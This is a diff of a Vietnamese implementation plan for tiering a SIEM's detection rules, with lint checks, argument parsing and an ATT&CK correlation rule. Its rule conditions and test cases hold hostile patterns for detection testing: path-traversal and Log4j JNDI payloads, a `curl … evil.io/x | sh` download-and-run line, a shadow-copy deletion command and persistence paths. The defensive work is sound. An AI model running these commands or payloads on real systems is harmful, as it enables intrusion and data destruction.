+| WEB-003 | `WEB-003-L` low | `any`[gốc, `url.decoded` regex [`\.\./`, `\.\.\\`, `/etc/`, `\\windows\\`], `url.original` regex `%2e%2e\|%252e`] | dương: `/img?f=../a.png`. Âm: `/a/b.png` |
 | WEB-004 | `WEB-004` critical | thêm `url.decoded` regex `\$\{\s*(jndi\|\$\{)`; thêm vế `user_agent.original` regex `\$\{\s*(jndi\|\$\{)` | dương: `${${lower:j}ndi:ldap://…}` trong URL, `${jndi:…}` trong User-Agent |
-| | `WEB-004-L` low, shadow | `any`[gốc, `url.decoded` regex `\$\{`, `user_agent.original` regex `\$\{`] | dương: `?q=${name}` (gốc im) |
+| | `WEB-004-L` low | `any`[gốc, `url.decoded` regex `\$\{`, `user_agent.original` regex `\$\{`] | dương: `?q=${name}` (gốc im) |
 | WEB-005, WEB-006 | medium → **low** | giữ; `suppress` của WEB-005 từ 300 lên 3600 | giữ |
 | WEB-007 | `WEB-007` high | `url.path` regex `(^\|/)(login\|signin\|logon\|wp-login\.php\|user/login\|admin/login\|account/login)(\.php\|\.aspx?\|\.jsp\|/)?$` | âm: 10× POST `/oauth/token` |
 | AUTH-004, AUTH-005 | medium → **low** | giữ; `group_by` lần lượt là `[source.ip]`, `[user.name]` | giữ |
 | AUTH-006 | `AUTH-006` medium | bỏ vế `outcome = failure`; vế dòng lệnh thành regex `^\s*(-[is]\s*$\|(\S*/)?(ba\|z\|da\|k)?sh\b\|(\S*/)?su(\s+-)?\s*$)` | dương: `-s`, `bash`. Âm: gõ sai mật khẩu 1 lần |
-| | **`AUTH-007`** low, shadow, threshold (mới) | `event.action = sudo` và `event.outcome = failure`; `threshold: {count: 3, window: 300, group_by: [user.name]}` | dương: 3 lần sai. Âm: 1 lần sai |
+| | **`AUTH-007`** low, threshold (mới) | `event.action = sudo` và `event.outcome = failure`; `threshold: {count: 3, window: 300, group_by: [user.name]}` | dương: 3 lần sai. Âm: 1 lần sai |
 | NET-001 | `NET-001` medium | thêm `source.ip_scope = private` | âm: nguồn public |
-| | `NET-001-L` low, shadow, threshold | điều kiện cũ (mọi nguồn) | dương: nguồn public |
+| | `NET-001-L` low, threshold | điều kiện cũ (mọi nguồn) | dương: nguồn public |
 | NET-002 | medium → **low** | giữ | giữ |
-| NET-004 | `NET-004-L` low, shadow | `event.category = intrusion_detection` và `suricata.severity <= 3` | dương: severity 3 |
+| NET-004 | `NET-004-L` low | `event.category = intrusion_detection` và `suricata.severity <= 3` | dương: severity 3 |
 | FIM-001 | `FIM-001` high → **medium**, vẫn chạy bóng (việc 1.1) | giữ | giữ |
-| | `FIM-001-L` low, shadow | `any`[gốc, `file.path` regex [`^/(root\|home/[^/]+)/\.(bashrc\|bash_profile\|profile\|zshrc)$`, `^/etc/(bash\.bashrc\|environment\|ld\.so\.conf\.d/\|update-motd\.d/\|xdg/autostart/\|init\.d/)`, `^/(usr/)?lib/systemd/system/`, `/\.config/(systemd/user\|autostart)/`], `registry.path` regex [`\\winlogon\\(userinit\|shell)$`, `\\image file execution options\\`, `\\policies\\explorer\\run$`]] | dương: `/home/u/.bashrc`. Âm: `/home/u/notes.txt` |
+| | `FIM-001-L` low | phỏng theo Elastic "Potential Persistence via File Modification" (cũng là low): `any`[gốc, `file.path` khớp toàn bộ danh sách đường dẫn của rule Elastic, đổi wildcard `*` thành regex `[^/]*`, `registry.path` regex [`\\winlogon\\(userinit\|shell)$`, `\\image file execution options\\`, `\\policies\\explorer\\run$`]] | dương: `/home/u/.bashrc`, `/etc/ld.so.preload`, `/etc/update-motd.d/99-x`. Âm: `/home/u/notes.txt` |
 | WIN-001, WIN-002, WIN-011, WEB-002, WEB-008, WEB-009, AUTH-001/002/003, LNX-004, NET-003, NET-005, TI-001 | giữ nguyên | | |
 
-Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13 rule có sẵn đổi `severity`:
+Tổng cộng thêm 23 rule:
+- 18 rule `-L`;
+- WEB-001-H;
+- 4 rule tách riêng hoặc mới: WIN-014, WIN-015, WIN-016, AUTH-007.
+
+14 rule có sẵn đổi `severity`:
 - WIN-003, 005, 006, 012;
 - LNX-003, 005, 006;
-- WEB-005, 006;
+- WEB-001, 005, 006;
 - AUTH-004, 005;
 - NET-002;
 - FIM-001.
@@ -162,7 +201,7 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 
 - [ ] **Step 1: Viết test fail.**
   - Thêm vào `test_check_rule_reports_each_problem` ca `({"id": "WIN-005-X"}, "id phải dạng")`.
-  - Thêm `test_check_rule_accepts_tier_suffix`: `check_rule(GOOD | {"id": "TST-001-L", "severity": "low"}, "x", False) == []`.
+  - Thêm `test_check_rule_accepts_tier_suffix`: `check_rule(GOOD | {"id": "TST-001-L", "severity": "low", "suppress": 3600, "group_by": ["agent.id"]}, "x", False) == []`.
   - Thêm `test_lint_checks_tier_family(tmp_path)` theo mẫu `test_lint_requires_positive_and_negative_cases_that_pass`: một thư mục rule tạm có `TST-001` (medium) và lần lượt từng biến thể dưới đây; mỗi biến thể phải sinh đúng một lỗi chứa chuỗi tương ứng:
     - `TST-001-L` severity medium → `"-L phải là low"`;
     - `TST-001-H` severity medium → `"-H phải là high hoặc critical"`;
@@ -180,24 +219,25 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 ## Task 2: Lint — bao hàm giữa các bậc, và quy định riêng cho rule low
 
 **Files:**
-- Modify: `server/siem/detection/lint.py` (`_cases`, `_playbooks`, `check_rule`)
+- Modify: `server/siem/detection/lint.py` (`_cases`, `_playbooks`, `check_rule`, hằng `GROUP_FIELDS`)
 - Test: `server/tests/test_rule_lint.py`
 
 **Interfaces:**
 - Consumes: `family_of`, `RuleInfo.severity`, `docs` từ Task 1; `run_case(rule, case) -> Result` (`ruletest.py:94`; `Result.fired` là số lần chính rule đó bắn).
-- Produces: thông điệp lỗi `"bậc dưới phải phủ bậc trên"`, `"rule low phải có suppress"`.
+- Produces: `GROUP_FIELDS: dict[str, set[str]]`, khóa là `logsource.category`, nếu không có thì `logsource.service`; giá trị theo mục Global Constraints. Thông điệp lỗi: `"bậc dưới phải phủ bậc trên"`, `"rule low phải có suppress"`, `"trường nhóm không có trong nguồn log"`.
 
 - [ ] **Step 1: Viết test fail.**
   - `test_lint_lower_tier_must_cover_upper_tier(tmp_path)`: `TST-001` bắt `process.name = nc`, `TST-001-L` bắt `process.name = ncat`, có ca dương `nc` cho TST-001. Kỳ vọng một lỗi chứa `"bậc dưới phải phủ bậc trên"` và tên ca.
   - `test_low_rule_needs_no_case_playbook(tmp_path)`: rule low có kỹ thuật chưa có playbook riêng thì không sinh lỗi playbook.
   - `test_low_match_rule_requires_suppress_and_group_by`: `check_rule(GOOD | {"severity": "low"}, …)` có lỗi chứa `"rule low phải có suppress"`; thêm `suppress: 3600, group_by: [agent.id]` thì hết lỗi.
-- [ ] **Step 2: Chạy, xác nhận cả 3 test fail.**
+  - `test_low_rule_group_field_matches_logsource`: `GOOD` (process_creation) low với `group_by: [source.ip]` có lỗi chứa `"trường nhóm không có trong nguồn log"`. Đây là bản rút gọn của `test_group_field_in_schemas` bên Elastic.
+- [ ] **Step 2: Chạy, xác nhận cả 4 test fail.**
 - [ ] **Step 3: Cài đặt.**
   - Trong `_cases`, với mỗi ca `expect == "alert"` của rule X, và mỗi rule Y cùng họ có mức độ thấp hơn X: nếu `run_case(compiled[Y], case).fired == 0` thì thêm lỗi.
   - `_playbooks` bỏ qua rule có `severity == "low"`.
-  - `check_rule`: rule `low` có `type: match` bắt buộc có `suppress >= 600` và `group_by` không rỗng.
+  - `check_rule`: rule `low` có `type: match` bắt buộc có `suppress >= 600`, `group_by` không rỗng và nằm trong `GROUP_FIELDS` của nguồn log.
 - [ ] **Step 4: Chạy `pytest tests/test_rule_lint.py -q`.** Kỳ vọng: PASS.
-- [ ] **Step 5: Commit** `lint: bậc dưới phải phủ bậc trên; rule low không cần case playbook, bắt buộc có suppress`.
+- [ ] **Step 5: Commit** `lint: bậc dưới phải phủ bậc trên; rule low không cần case playbook, bắt buộc có suppress và trường nhóm hợp lệ`.
 
 ## Task 3: Lint — chỉ bậc cao nhất được phản ứng tự động
 
@@ -242,10 +282,37 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
   - `test_windash_ignores_inner_hyphen`: `_windash("x-y") == ["x-y"]`. Chỉ dấu gạch đứng đầu chuỗi hoặc sau khoảng trắng/ngoặc kép mới là cờ, giữ đúng điều kiện hiện có.
 - [ ] **Step 2: Chạy `pytest tests/test_sigma.py -q -k windash`.** Kỳ vọng: FAIL (hiện chỉ 3 ký tự, chỉ vị trí đầu).
 - [ ] **Step 3: Cài đặt.** Tìm mọi vị trí cờ, rồi dùng `itertools.product` trên 5 ký tự.
-- [ ] **Step 4: Chạy `pytest tests/test_sigma.py -q`.** Kỳ vọng: PASS. Chạy lại `python ../tools/sigmahq_import.py --zip D:/GSANM/BTL/siem-xdr/datasets/raw/sigma_all_rules.zip --datasets D:/GSANM/BTL/siem-xdr/datasets/processed` (không `--write`; dataset chỉ có ở checkout chính) và ghi số rule biên dịch được trước/sau vào thông điệp commit.
+- [ ] **Step 4: Chạy `pytest tests/test_sigma.py -q`.** Kỳ vọng: PASS. Chạy lại `python ../tools/sigmahq_import.py --zip D:/GSANM/BTL/siem-xdr/datasets/raw/sigma_all_rules.zip --datasets D:/GSANM/BTL/siem-xdr/datasets/processed` (không `--write`) và ghi số rule biên dịch được trước/sau vào thông điệp commit.
 - [ ] **Step 5: Commit** `sigma: windash đủ 5 ký tự, mọi vị trí (tối đa 3) như pySigma`.
 
-## Task 5: Alert low không vào phần việc của analyst (KPI, console, E2E)
+## Task 5: `process.args` — tách tham số dòng lệnh như Elastic
+
+**Files:**
+- Modify: `server/siem/pipeline/normalize.py` (thêm `split_windows_args`, `split_unix_args`; một bước cuối trong `normalize()`)
+- Test: `server/tests/test_pipeline.py`
+
+**Interfaces:**
+- Produces:
+  - `split_windows_args(cmd: str) -> list[str]`, theo quy tắc `CommandLineToArgvW`: tham số đầu là tên chương trình, chỉ cắt ở ngoặc kép; với tham số còn lại, `2n` dấu `\` trước `"` thành `n` dấu `\` và `"` bật/tắt chế độ ngoặc; `2n+1` dấu `\` trước `"` thành `n` dấu `\` cộng một `"` thật; `\` không đứng trước `"` giữ nguyên.
+  - `split_unix_args(cmd: str) -> list[str]`: dùng `shlex.split(cmd)`, gặp `ValueError` thì `cmd.split()`. Chọn cách này vì `siem-procs` nối `/proc/<pid>/cmdline` bằng dấu cách nên đã mất ranh giới tham số.
+  - Trường `process.args` (list) có trên mọi event có `process.command_line`. Event Windows (`event.module in [windows, sysmon]` hoặc `agent.os = windows`) dùng `split_windows_args`, còn lại dùng `split_unix_args`.
+
+- [ ] **Step 1: Viết test fail.**
+  - `test_split_windows_args`:
+    - `split_windows_args('"C:\\Program Files\\x\\vssadmin.exe" delete shadows /all') == ['C:\\Program Files\\x\\vssadmin.exe', 'delete', 'shadows', '/all']`;
+    - `split_windows_args('a "b c" d') == ['a', 'b c', 'd']`;
+    - `split_windows_args('a \\"b c') == ['a', '"b', 'c']`;
+    - `split_windows_args('a "unterminated') == ['a', 'unterminated']`.
+  - `test_split_unix_args`:
+    - `split_unix_args("bash -c 'curl x | sh'") == ['bash', '-c', 'curl x | sh']`;
+    - `split_unix_args("echo 'oops") == ['echo', "'oops"]`.
+  - `test_process_args_after_normalize`: một event Sysmon EID 1 đi qua helper `win(...)` của `test_pipeline.py` với dòng lệnh vssadmin có ngoặc kép; kỳ vọng `get(doc, "process.args")[1:3] == ["delete", "shadows"]`.
+- [ ] **Step 2: Chạy `pytest tests/test_pipeline.py -q -k args`.** Kỳ vọng: FAIL (chưa có hàm).
+- [ ] **Step 3: Cài đặt** hai hàm và bước cuối trong `normalize()`; không ghi đè `process.args` nếu parser đã đặt sẵn.
+- [ ] **Step 4: Chạy `pytest -q`.** Kỳ vọng: PASS. Rule hiện có không dùng `process.args` nên không đổi kết quả.
+- [ ] **Step 5: Commit** `pipeline: process.args tách theo CommandLineToArgvW (Windows) / shlex (Linux), như ECS của Elastic`.
+
+## Task 6: Alert low không vào phần việc của analyst (KPI, console, E2E)
 
 **Files:**
 - Modify: `server/siem/manager/kpi.py:74-75` (`must_not` thêm `{"term": {"severity": "low"}}`)
@@ -257,12 +324,12 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 - [ ] **Step 2: Chạy `pytest tests/test_kpi.py -q`.** Kỳ vọng: FAIL.
 - [ ] **Step 3: Cài đặt.**
   - `kpi.py`: thêm điều kiện vào `must_not`.
-  - `console.html`: mặc định `sev: ['critical', 'high', 'medium']`; `fromRoute` cũng đặt giá trị này thay cho `[]`. Analyst bấm chip "Thấp" để xem tín hiệu.
+  - `console.html`: mặc định `sev: ['critical', 'high', 'medium']`; `fromRoute` cũng đặt giá trị này thay cho `[]`. Analyst bấm chip "Thấp" để xem tín hiệu, giống building block của Elastic ẩn khỏi danh sách alert.
   - `e2e_test.py`: `alert()` so khớp đúng mã `a["rule"]["id"] == rule_id`. Cả 4 chỗ gọi hiện có (`WEB-001`, `LNX-002` ×2, `WZH-100100`, `WZH-553`) đều truyền mã đầy đủ, nên không cần giữ cách so tiền tố.
 - [ ] **Step 4: Chạy `pytest tests/test_kpi.py -q`.** Kỳ vọng: PASS. Mở console bằng `tools/ui_test.py` (memory `siem-xdr-test-workflow`) và xác nhận danh sách Cảnh báo mặc định không còn alert low.
 - [ ] **Step 5: Commit** `alert low (tín hiệu RBA) không tính vào KPI, ẩn khỏi danh sách mặc định; E2E so đúng mã rule`.
 
-## Task 6: Báo cáo độ phủ theo bậc
+## Task 7: Báo cáo độ phủ theo bậc
 
 **Files:**
 - Modify: `server/siem/ai/benchmark.py` (thêm `--min-severity`, mặc định `low`)
@@ -271,7 +338,7 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 - [ ] **Step 2: Kiểm.** Ở checkout chính (dataset chỉ có ở đó), chạy `python -m siem.ai.benchmark --datasets ../datasets/processed --min-severity medium`. Kỳ vọng: số Windows bằng số trước khi chuyển bậc, vì hiện chưa có rule low.
 - [ ] **Step 3: Commit** `benchmark: --min-severity để báo cáo độ phủ theo bậc`.
 
-## Task 7: Họ thử nghiệm LNX-003
+## Task 8: Họ thử nghiệm LNX-003
 
 **Files:**
 - Modify: `server/rules/linux.yml` (LNX-003, thêm LNX-003-L)
@@ -282,13 +349,13 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 
 - [ ] **Step 1: Viết ca test trước.**
   - Ghi vào `rules/cases/linux.yml` mọi ca dương/âm ✓ của dòng LNX-003 cho cả hai rule. Event cần có `agent: {id: "001"}`.
-  - Thêm `test_lnx003_tier_via_real_parser` vào `test_pipeline.py`: đưa `curl -s https://get.docker.com.evil.io/x | sh` qua cùng đường parser mà helper `proc(...)` của file này dùng; kỳ vọng cả `LNX-003-L` lẫn `LNX-003` cùng bắn.
+  - Thêm `test_lnx003_tier_via_real_parser` vào `test_pipeline.py`: đưa `curl -s https://get.docker.com.evil.io/x | sh` qua helper `proc(...)` của file này (đi qua `raw` → `normalize` → `enrich`); kỳ vọng cả `LNX-003-L` lẫn `LNX-003` cùng bắn.
 - [ ] **Step 2: Chạy `python ../tools/rule_lint.py`.** Kỳ vọng: lỗi "rule LNX-003-L không tồn tại" và ca `get.docker.com.evil.io` của LNX-003 fail.
 - [ ] **Step 3: Sửa `linux.yml`.** Viết lại LNX-003 (severity medium) và thêm LNX-003-L (low, shadow, `shadow_since`, `suppress: 3600`, `group_by: [agent.id]`) đúng như bảng. Mô tả trong khóa `falsepositives` nêu rõ: bộ cài chính thức chỉ còn bắn ở bậc `-L`.
 - [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest tests/test_pipeline.py tests/test_rule_lint.py -q`. Kỳ vọng: PASS, kể cả test hồi quy cũ `test_pipeline.py:200-233`.
 - [ ] **Step 5: Commit** `LNX-003: tách bậc -L (không danh sách cho phép) và gốc medium; sửa lỗ lách danh sách cho phép`.
 
-## Task 8: Họ thử nghiệm WIN-005
+## Task 9: Họ thử nghiệm WIN-005
 
 **Files:**
 - Modify: `server/rules/windows.yml`, `server/rules/cases/windows.yml`
@@ -302,38 +369,48 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 - [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS. Chỉ được fail test đã biết ở mục Global Constraints.
 - [ ] **Step 5: Commit** `WIN-005: bậc -L bắt mọi dạng cờ (windash, đổi tên); gốc medium giữ loại trừ Ansible`.
 
-## Task 9: Windows — chuyển các họ còn lại và tách rule
+## Task 10: Windows — chuyển các họ còn lại, tách rule, thêm WIN-016
 
 **Files:**
 - Modify: `server/rules/windows.yml`, `server/rules/cases/windows.yml`
 - Modify: `server/config/playbooks.yml` (danh sách diệt tiến trình: `WIN-006` → `WIN-014`)
-- Modify: `server/config/case_playbooks.yml` (thêm `WIN-014` vào playbook đang khớp WIN-006, thêm `WIN-015` vào playbook đang khớp WIN-007; kiểm bằng lint)
+- Modify: `server/config/case_playbooks.yml` (thêm `WIN-014` vào playbook đang khớp WIN-006, thêm `WIN-015` vào playbook đang khớp WIN-007, `WIN-016` vào PB-03; kiểm bằng lint)
 - Modify: `server/siem/pipeline/normalize.py:421-424` (`put(doc, "group.id", f.get("TargetSid"))`)
 - Test: `server/tests/test_pipeline.py`
 
+**Interfaces:** Consumes: `process.args` từ Task 5.
+
 - [ ] **Step 1: Viết ca test trước.**
-  - Ca test cho WIN-003, 004, 006, 007, 008, 009, 010, 012, 013, 014, 015 theo bảng.
+  - Ca test cho WIN-003, 004, 006, 007, 008, 009, 010, 012, 013, 014, 015, 016 theo bảng. Ca dương của WIN-015 cần `winlog.event_data.SourceImage`; parser đã giữ nguyên `winlog.event_data` (`normalize.py:373`).
   - Thêm `test_group_member_added_keeps_group_sid`: event 4732 có `TargetSid` S-1-5-32-544, sau `normalize` thì `group.id == "S-1-5-32-544"`.
   - Sửa event 4732 trong `test_windows_rules` (`test_pipeline.py:175`): thêm `"TargetSid": "S-1-5-32-544"`. Nếu không, WIN-004 (so theo SID) sẽ không bắn ở vòng kiểm dòng 184.
 - [ ] **Step 2: Chạy lint và test.** Kỳ vọng: FAIL đúng ở các ca mới.
-- [ ] **Step 3: Cài đặt.** Sửa YAML theo bảng, sửa hai file playbook, sửa `normalize.py`.
+- [ ] **Step 3: Cài đặt.**
+  - Sửa YAML theo bảng. Danh sách tiến trình của WIN-008-L và WIN-016 chép từ rule Elastic tương ứng tại commit `9431b803`, kèm comment và `references` như mục Global Constraints.
+  - Sửa hai file playbook và `normalize.py`.
 - [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` (gồm kiểm phản ứng tự động của Task 3) và `pytest -q`. Kỳ vọng: PASS. Đọc lại thay đổi `severity` của từng rule trong `test_pipeline.py:184` (WIN-002/004/005/008/010 vẫn phải bắn).
-- [ ] **Step 5: Commit** `Windows: phân bậc WIN-005..013, tách WIN-014 (4104) và WIN-015 (truy cập LSASS), WIN-004 so theo SID`.
+- [ ] **Step 5: Commit** `Windows: phân bậc WIN-005..013 (khớp process.args), tách WIN-014 / WIN-015, thêm WIN-016, WIN-004 so theo SID`.
 
-## Task 10: Linux, Web, Auth, Mạng, FIM — chuyển các họ còn lại
+## Task 11: Linux, Web, Auth, Mạng, FIM — chuyển các họ còn lại
 
 **Files:**
 - Modify: `server/rules/{linux,web,auth,network,fim}.yml` và các file tương ứng trong `server/rules/cases/`
-- Modify: `wazuh/manager/agent.conf` (thêm thư mục syscheck cho FIM-001-L: `/etc/ld.so.conf.d`, `/etc/update-motd.d`, `/etc/xdg/autostart`, `/etc/init.d`, `/usr/lib/systemd/system`, `/etc/environment`, `/etc/bash.bashrc`, `/root/.bashrc`; khóa registry `Winlogon`, `Image File Execution Options`, `Policies\Explorer\Run`)
+- Modify: `wazuh/manager/agent.conf` (thêm thư mục syscheck cho mọi đường dẫn của FIM-001-L chưa được giám sát; Windows thêm khóa `Winlogon`, `Image File Execution Options`, `Policies\Explorer\Run`)
 - Test: `server/tests/test_pipeline.py`, `server/tests/test_fim_rules.py`
 
-- [ ] **Step 1: Viết ca test trước** cho mọi dòng LNX-001/002/005/006, WEB-001/003/004/005/006/007, AUTH-004/005/006/007, NET-001/002/004, FIM-001 trong bảng. Trong đó có ca âm Jenkins (java → sh) cho LNX-002 và 10× POST `/oauth/token` cho WEB-007.
+- [ ] **Step 1: Viết ca test trước** cho mọi dòng LNX-001/002/005/006, WEB-001/003/004/005/006/007, AUTH-004/005/006/007, NET-001/002/004, FIM-001 trong bảng. Trong đó có:
+  - ca âm Jenkins (java → sh) cho LNX-002;
+  - 10× POST `/oauth/token` cho WEB-007;
+  - payload SQLi của e2e cho WEB-001-H.
 - [ ] **Step 2: Chạy lint và test.** Kỳ vọng: FAIL đúng ở các ca mới.
-- [ ] **Step 3: Cài đặt** theo bảng và sửa `agent.conf`.
-- [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS. Kiểm riêng `test_fim_rules.py`: `covered_by` vẫn trả `FIM-001` khi FIM-001 chạy chính thức.
-- [ ] **Step 5: Commit**, mỗi lĩnh vực một commit, ví dụ `Linux: phân bậc LNX-001/002/006; LNX-002 bỏ cha java/php khỏi bậc diệt tiến trình`.
+- [ ] **Step 3: Cài đặt** theo bảng, kèm ghi nguồn Elastic cho LNX-001, WEB-001-H và FIM-001-L; sửa `agent.conf`.
+- [ ] **Step 4: Chạy.**
+  - `python ../tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS. Kiểm riêng `test_fim_rules.py`: `covered_by` vẫn trả `FIM-001` khi FIM-001 chạy chính thức.
+  - Ở checkout chính, chạy `python -m siem.ai.benchmark --datasets ../datasets/processed --write ../datasets/report.md`. Kỳ vọng: mục theo từng rule (`per_rule`, cột "normal") ghi WEB-001-H bắt 0 mẫu bình thường, và bắt khoảng 552 mẫu tấn công như lần đo 22/10.
+  - E2E bước sqli vẫn có `block_ip`, nay do WEB-001-H kích hoạt.
+- [ ] **Step 5: Commit**, mỗi lĩnh vực một commit, ví dụ `Web: WEB-001-H (payload SQLi cụ thể, phỏng theo Elastic) giữ chặn IP; WEB-001 gốc medium`.
 
-## Task 11: SigmaHQ — nhập theo bậc và nhập đích danh
+## Task 12: SigmaHQ — nhập theo bậc và nhập đích danh
 
 **Files:**
 - Modify: `tools/sigmahq_import.py` (`candidates`, phần ghi YAML, argparse)
@@ -354,7 +431,7 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 - [ ] **Step 4: Chạy test**, rồi chạy công cụ ở chế độ chỉ đo (không `--write`) và ghi số rule nhập được theo từng bậc.
 - [ ] **Step 5: Commit** `sigmahq_import: hạ một bậc khi nhập, rule low không cần case playbook, --ids nhập đích danh`.
 
-## Task 12: SigmaHQ — chuyển bậc lô 1 và nhập lô thay thế
+## Task 13: SigmaHQ — chuyển bậc lô 1 và nhập lô thay thế
 
 **Files:**
 - Modify: `server/rules/sigmahq/lo-01.yml` (chỉ `severity`, `suppress`, `group_by`)
@@ -374,17 +451,41 @@ Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13
 - [ ] **Step 4:** Chạy `python tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS, mọi ca dương vừa thêm đều đạt, tức 9/12 biến thể Windows bị lọt ngày 21/10 nay đã có rule bắt.
 - [ ] **Step 5: Commit** `SigmaHQ: lô 1 hạ một bậc; lô 2 thay thế (9 rule bắt biến thể lách)`.
 
-## Task 13: Đo, hiệu chỉnh, tài liệu (09–12/11, chỉ sửa lỗi)
+## Task 14: Đo, hiệu chỉnh, tài liệu (09–12/11, chỉ sửa lỗi)
 
 **Files:**
-- Modify: `RULES.md` (mục 2.2 định dạng mã/bậc, 2.11 lint mới, 3 bảng rule, 4 độ phủ hai dòng ≥ medium / mọi bậc)
-- Modify: `SOC-OPERATIONS.md` mục 4 (bảng bậc, tiêu chí bật chính thức), `PLAYBOOKS.md` (danh sách diệt tiến trình), `Test.md`
+- Modify: `RULES.md`:
+  - mục 2.2: định dạng mã và bậc;
+  - mục 2.11: các kiểm tra lint mới;
+  - mục 3: bảng rule;
+  - mục 4: độ phủ hai dòng (≥ medium / mọi bậc);
+  - một dòng nguồn: Elastic, Elastic License 2.0.
+- Modify: `SOC-OPERATIONS.md` mục 4 (bảng bậc, tiêu chí bật chính thức), `PLAYBOOKS.md` (danh sách diệt tiến trình, chặn IP do WEB-001-H), `Test.md`
 
 - [ ] **Step 1:** Chạy `python -m siem.ai.benchmark --datasets ../datasets/processed --min-severity medium` và lặp lại với `--min-severity low`; ghi hai dòng vào `RULES.md` mục 4.
-- [ ] **Step 2:** Trên log lab ≥ 7 ngày (việc 1.4), đếm alert/ngày/máy của từng rule `-L` bằng truy vấn ES `siem-alerts` (`rule.id` kết thúc bằng `-L`, `alert.shadow: true`). Rule nào đạt tiêu chí ở bảng Bậc thì commit đổi `mode: active`; rule vượt tiêu chí thì thu hẹp điều kiện hoặc để chạy bóng tiếp.
+- [ ] **Step 2:** Trên log lab ≥ 7 ngày (việc 1.4), đếm alert/ngày/máy của từng rule mới bằng truy vấn ES `siem-alerts` (`alert.shadow: true`). Rule nào đạt tiêu chí ở bảng Bậc thì commit đổi `mode: active`; rule vượt tiêu chí thì thu hẹp điều kiện hoặc để chạy bóng tiếp.
 - [ ] **Step 3: Hiệu chỉnh RBA.**
   - Chạy `tools/e2e_test.py` trên stack: phải sinh RBA-001 cho máy bị tấn công nhiều bước.
   - Trên 7 ngày log lab bình thường: không được sinh RBA-001.
   - Nếu sai thì chỉnh `RBA_THRESHOLD` hoặc `RBA_MIN_RULES` trong `.env` và ghi lý do vào `SOC-OPERATIONS.md`.
 - [ ] **Step 4:** Cập nhật tài liệu theo danh sách Files.
-- [ ] **Step 5: Commit** `Tài liệu: mô hình phân bậc, số đo độ phủ theo bậc, tiêu chí bật rule -L`.
+- [ ] **Step 5: Commit** `Tài liệu: mô hình phân bậc, số đo độ phủ theo bậc, tiêu chí bật rule -L, nguồn Elastic`.
+
+## Task 15 (sau v1.0): RBA-002 — alert thuộc nhiều chiến thuật ATT&CK trên một máy
+
+Phỏng theo Elastic "Alerts in Different ATT&CK Tactics by Host" (`rules/cross-platform/multiple_alerts_risky_host_esql.toml`).
+
+**Files:**
+- Modify: `server/siem/soar/risk.py` (`Contribution` thêm `severity: str = "medium"`; `RiskTracker` thêm kiểm RBA-002)
+- Modify: `server/siem/settings.py` (`RBA2_WINDOW_HOURS = 8`, `RBA2_MIN_TACTICS = 3`)
+- Modify: `server/siem/rules_catalog.py` (khai báo detector RBA-002 cạnh RBA-001)
+- Test: `server/tests/test_risk_health.py`
+
+- [ ] **Step 1: Viết test fail.**
+  - `test_rba2_fires_on_three_tactics_from_two_rules`: 3 alert medium, thuộc 3 chiến thuật khác nhau (`rule.mitre.tactic`), từ ≥ 2 rule, cùng máy, trong 8 giờ → một alert `RBA-002` high.
+  - `test_rba2_ignores_low_alerts`: như trên nhưng một alert là low → không bắn. Elastic chỉ tính alert có `risk_score > 21`.
+  - `test_rba2_one_rule_many_tactics_does_not_fire`: 1 rule gắn 3 chiến thuật → không bắn. Elastic nêu lý do: "Distinct rule IDs prevent one rule mapped to multiple tactics from satisfying the correlation".
+- [ ] **Step 2: Chạy, xác nhận fail.**
+- [ ] **Step 3: Cài đặt** trong `RiskTracker.add`, dùng lại `entities` và `build`. Chỉ xét thực thể `host.name`, mỗi mức tối đa bắn một lần (giống `self.fired`).
+- [ ] **Step 4: Chạy `pytest tests/test_risk_health.py -q`.** Kỳ vọng: PASS.
+- [ ] **Step 5: Commit** `RBA-002: alert thuộc ≥ 3 chiến thuật ATT&CK từ ≥ 2 rule trên một máy trong 8 giờ (phỏng theo Elastic)`.
